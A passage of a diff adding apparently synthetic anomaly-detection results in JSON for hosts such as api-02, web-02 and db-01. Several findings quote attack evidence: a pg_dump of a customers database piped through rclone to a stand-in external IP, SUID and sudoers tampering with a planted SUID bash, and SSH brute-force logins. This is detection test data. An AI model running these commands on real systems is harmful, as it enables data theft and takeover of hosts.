+        "z":1.63
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":-0.82
+      },
+      {
+        "metric":"mem_pct",
+        "z":-0.51
+      }
+    ],
+    "findings":[
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:55:05.510583+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1543 MB sent to external 203.0.113.222:443",
+        "evidence":"ESTABLISHED 10.0.1.13:54310 -> 203.0.113.222:443 proto=tcp bytes_out=1543000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:55:40.784398+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1302 MB sent to external 203.0.113.222:8443",
+        "evidence":"ESTABLISHED 10.0.1.13:53060 -> 203.0.113.222:8443 proto=tcp bytes_out=1302000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:55:53.054599+00:00",
+        "rule_id":"EXFIL-001",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"Database dump piped to an external uploader",
+        "evidence":"type=EXECVE uid=svc_report cmd=\"pg_dump -Fc customers | rclone rcat remote:203.0.113.222\/drop\/customers.dump\"",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:56:04.644183+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1086 MB sent to external 203.0.113.222:4444",
+        "evidence":"ESTABLISHED 10.0.1.13:49204 -> 203.0.113.222:4444 proto=tcp bytes_out=1086000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:56:27.821553+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1601 MB sent to external 203.0.113.222:21",
+        "evidence":"ESTABLISHED 10.0.1.13:44511 -> 203.0.113.222:21 proto=tcp bytes_out=1601000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:56:39.820779+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1350 MB sent to external 203.0.113.222:443",
+        "evidence":"ESTABLISHED 10.0.1.13:52206 -> 203.0.113.222:443 proto=tcp bytes_out=1350000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:57:48.720929+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"975 MB sent to external 203.0.113.222:8443",
+        "evidence":"ESTABLISHED 10.0.1.13:48860 -> 203.0.113.222:8443 proto=tcp bytes_out=975000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:57:50.064506+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"897 MB sent to external 203.0.113.222:4444",
+        "evidence":"ESTABLISHED 10.0.1.13:57488 -> 203.0.113.222:4444 proto=tcp bytes_out=897000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:57:56.272576+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1242 MB sent to external 203.0.113.222:443",
+        "evidence":"ESTABLISHED 10.0.1.13:56176 -> 203.0.113.222:443 proto=tcp bytes_out=1242000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:58:02.947598+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1410 MB sent to external 203.0.113.222:4444",
+        "evidence":"ESTABLISHED 10.0.1.13:50123 -> 203.0.113.222:4444 proto=tcp bytes_out=1410000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:58:32.389450+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1655 MB sent to external 203.0.113.222:21",
+        "evidence":"ESTABLISHED 10.0.1.13:46876 -> 203.0.113.222:21 proto=tcp bytes_out=1655000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:59:41.107007+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1089 MB sent to external 203.0.113.222:21",
+        "evidence":"ESTABLISHED 10.0.1.13:53867 -> 203.0.113.222:21 proto=tcp bytes_out=1089000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:59:51.584982+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1504 MB sent to external 203.0.113.222:21",
+        "evidence":"ESTABLISHED 10.0.1.13:50749 -> 203.0.113.222:21 proto=tcp bytes_out=1504000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T04:59:57.872792+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1739 MB sent to external 203.0.113.222:8443",
+        "evidence":"ESTABLISHED 10.0.1.13:58842 -> 203.0.113.222:8443 proto=tcp bytes_out=1739000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T05:01:06.529943+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1174 MB sent to external 203.0.113.222:8443",
+        "evidence":"ESTABLISHED 10.0.1.13:47883 -> 203.0.113.222:8443 proto=tcp bytes_out=1174000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T05:02:56.119251+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1130 MB sent to external 203.0.113.222:443",
+        "evidence":"ESTABLISHED 10.0.1.13:44714 -> 203.0.113.222:443 proto=tcp bytes_out=1130000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T05:02:58.830984+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1383 MB sent to external 203.0.113.222:443",
+        "evidence":"ESTABLISHED 10.0.1.13:56904 -> 203.0.113.222:443 proto=tcp bytes_out=1383000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T05:03:17.019773+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1567 MB sent to external 203.0.113.222:443",
+        "evidence":"ESTABLISHED 10.0.1.13:47184 -> 203.0.113.222:443 proto=tcp bytes_out=1567000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T05:03:50.163999+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1699 MB sent to external 203.0.113.222:8443",
+        "evidence":"ESTABLISHED 10.0.1.13:45540 -> 203.0.113.222:8443 proto=tcp bytes_out=1699000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-16T05:04:52.086813+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"990 MB sent to external 203.0.113.222:21",
+        "evidence":"ESTABLISHED 10.0.1.13:49544 -> 203.0.113.222:21 proto=tcp bytes_out=990000000 process=rclone",
+        "source_ip":"203.0.113.222"
+      }
+    ]
+  },
+  {
+    "key":"api-01:error_burst:20260116T0551",
+    "host":"api-01",
+    "role":"api",
+    "start":"2026-01-16T05:51:00+00:00",
+    "end":"2026-01-16T06:19:00+00:00",
+    "peak_score":6.1573,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"error_burst",
+    "category":"operational",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"error_rate_pct",
+        "z":42.67
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":4.92
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":0.47
+      },
+      {
+        "metric":"cpu_pct",
+        "z":-0.45
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-01:traffic_surge:20260116T0637",
+    "host":"web-01",
+    "role":"web",
+    "start":"2026-01-16T06:37:00+00:00",
+    "end":"2026-01-16T07:33:00+00:00",
+    "peak_score":9.3885,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"traffic_surge",
+    "category":"operational",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"requests_per_sec",
+        "z":27.75
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":23.52
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":17.48
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":5.88
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-02:privilege_escalation:20260116T0649",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-16T06:49:00+00:00",
+    "end":"2026-01-16T07:02:00+00:00",
+    "peak_score":0.9139,
+    "detectors":[
+      "isolation_forest",
+      "security_rules"
+    ],
+    "suspected_type":"privilege_escalation",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"failed_logins",
+        "z":2.18
+      },
+      {
+        "metric":"process_count",
+        "z":1.47
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.26
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":0.9
+      }
+    ],
+    "findings":[
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:49:18.060266+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:49:50.411267+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=www-data cmd=\"find \/ -perm -4000 -type f\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:50:12.323259+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:50:59.786786+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=www-data cmd=\"find \/ -perm -4000 -type f\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:51:59.064349+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:52:44.912160+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:53:04.688334+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=www-data cmd=\"find \/ -perm -4000 -type f\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:53:36.018618+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:54:03.735031+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:54:28.481229+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=www-data cmd=\"find \/ -perm -4000 -type f\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:54:34.989382+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:55:45.775722+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:57:04.894699+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:57:30.243738+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:57:49.900314+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:58:42.750933+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:58:52.925448+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:59:27.999103+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T06:59:40.011883+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"web-02",
+        "timestamp":"2026-01-16T07:01:12.217209+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      }
+    ]
+  },
+  {
+    "key":"db-01:ssh_brute_force:20260116T0805",
+    "host":"db-01",
+    "role":"db",
+    "start":"2026-01-16T08:05:00+00:00",
+    "end":"2026-01-16T08:49:00+00:00",
+    "peak_score":6.817,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"ssh_brute_force",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"failed_logins",
+        "z":46.59
+      },
+      {
+        "metric":"process_count",
+        "z":2.18
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.63
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":0.77
+      }
+    ],
+    "findings":[
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:06.648836+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"15 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user user from 203.0.113.83 port 49160 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:06.700366+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"16 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user git from 203.0.113.83 port 40509 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:07.721246+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"17 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user oracle from 203.0.113.83 port 32501 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:09.294277+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"18 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.83 port 35472 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:09.729384+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"19 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user deploy from 203.0.113.83 port 62420 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:10.355756+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"20 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.83 port 53703 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:10.550817+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"21 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user oracle from 203.0.113.83 port 40820 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:11.044656+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"22 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user root from 203.0.113.83 port 63718 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:11.239038+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"23 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.83 port 57751 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:11.251325+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"24 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.83 port 33869 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:11.887458+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"25 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user root from 203.0.113.83 port 41833 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:12.183388+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"26 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user pi from 203.0.113.83 port 39301 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:12.313438+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"27 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user pi from 203.0.113.83 port 62197 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:12.445917+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"28 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.83 port 55434 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:12.450013+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"29 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.83 port 42655 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:12.779500+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"30 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.83 port 38929 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:13.495625+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"31 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user user from 203.0.113.83 port 43890 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:15.407503+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"32 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.83 port 45646 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:15.900089+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"33 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user ubuntu from 203.0.113.83 port 36056 ssh2",
+        "source_ip":"203.0.113.83"
+      },
+      {
+        "host":"db-01",
+        "timestamp":"2026-01-16T08:05:16.340769+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"34 failed SSH logins from 203.0.113.83 in 5 min",
+        "evidence":"Failed password for invalid user git from 203.0.113.83 port 38527 ssh2",
+        "source_ip":"203.0.113.83"
+      }
+    ]
+  },
+  {
+    "key":"api-01:ssh_brute_force:20260116T1015",
+    "host":"api-01",
+    "role":"api",
+    "start":"2026-01-16T10:15:00+00:00",
+    "end":"2026-01-16T10:34:00+00:00",
+    "peak_score":6.8534,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"ssh_brute_force",
+    "category":"security",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"failed_logins",
+        "z":39.47
+      },
+      {
+        "metric":"process_count",
+        "z":2.95
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":1.25
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.25
+      }
+    ],
+    "findings":[
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:07.505079+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"15 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.100 port 50090 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:07.749267+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"16 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.100 port 62551 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:08.204108+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"17 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user deploy from 203.0.113.100 port 41289 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:08.229268+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"18 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user postgres from 203.0.113.100 port 64164 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:08.431844+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"19 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user root from 203.0.113.100 port 32861 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:09.111528+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"20 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user user from 203.0.113.100 port 48570 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:09.670828+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"21 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.100 port 32801 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:10.053852+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"22 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.100 port 53889 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:10.151564+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"23 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for root from 203.0.113.100 port 57552 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-16T10:15:10.361176+00:00",
+        "rule_id":"BRUTE-001",
+        "incident_type":"ssh_brute_force",
+        "severity":"high",
+        "description":"24 failed SSH logins from 203.0.113.100 in 5 min",
+        "evidence":"Failed password for invalid user git from 203.0.113.100 port 64033 ssh2",
+        "source_ip":"203.0.113.100"
+      },
+      {
+        "host":"api-01",
